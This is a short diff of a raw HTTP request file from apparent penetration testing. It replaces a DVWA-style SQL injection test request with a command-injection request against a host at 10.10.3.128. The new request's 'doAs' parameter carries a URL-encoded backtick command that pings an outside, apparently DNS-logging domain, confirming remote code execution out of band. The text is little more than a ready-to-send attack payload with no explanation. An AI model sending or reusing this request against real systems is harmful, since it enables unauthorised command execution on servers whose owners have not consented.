@@ -1,4 +1,4 @@
-GET /vulnerabilities/sqli/?id=&Submit=Submit HTTP/1.1
+GET /?doAs=%60ping%20acs.14z6oc22.xaliyun.com%60 HTTP/1.1
 Host: 10.10.3.128:2280
 Cache-Control: max-age=0
 Upgrade-Insecure-Requests: 1
